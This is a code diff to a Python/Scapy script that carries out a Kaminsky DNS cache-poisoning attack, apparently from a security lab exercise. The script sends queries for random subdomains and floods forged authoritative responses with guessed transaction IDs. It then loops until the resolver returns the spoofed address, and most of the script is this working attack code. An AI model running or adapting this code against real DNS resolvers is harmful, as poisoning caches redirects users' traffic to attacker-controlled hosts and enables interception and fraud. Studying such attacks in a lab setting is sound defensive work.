@@ -59,16 +59,18 @@ def exampleSendDNSQuery():
     print response.show()
     print "***** End of Remote Server Packet *****\n"
 
-subdom= getRandomSubDomain() + '.' + domain_name
-def mySendDNSQuery():
+#subdom= getRandomSubDomain() + '.' + domain_name
+def mySendDNSQuery(subdom):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     dnsPacket = DNS(rd=1, qd=DNSQR(qname=subdom))
     sendPacket(sock, dnsPacket, my_ip, my_port)
 
     return sock
 
-def dnsSpoofer():
+def dnsSpoofer(subdom):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    #qd = DNSQR(qname=subdom)
+    #an = DNSRR(rrname=subdom, type='A', rdata=addr_to_spoof, ttl=68900)
     dns = DNS(
             id = getRandomTXID(),
             aa = 1,
@@ -76,7 +78,7 @@ def dnsSpoofer():
             qr = 1,
             qdcount = 1,
             ancount = 1,
-            nscount = 2,
+            nscount = 1,
             arcount = 0,
             qd = DNSQR(qname=subdom),
             an = DNSRR(rrname=subdom, type='A', rdata=addr_to_spoof, ttl=68900),
@@ -96,11 +98,10 @@ def dnsSpoofer():
 def kaminskyAttack():
     while 1:
         subdom = getRandomSubDomain() + '.' + domain_name
-        sock = mySendDNSQuery()
-        dnsSpoofer()
-        data, _ = sock.recvfrom(4096)
+        sock = mySendDNSQuery(subdom=subdom)
+        dnsSpoofer(subdom=subdom)
+        data, _ = sock.recvfrom(1024)
         resp = DNS(data)
-        #4096, ttl 68900
         if resp[DNS].an and resp[DNS].an.rdata == addr_to_spoof:
             print("kaminsky success")
             sock.close()
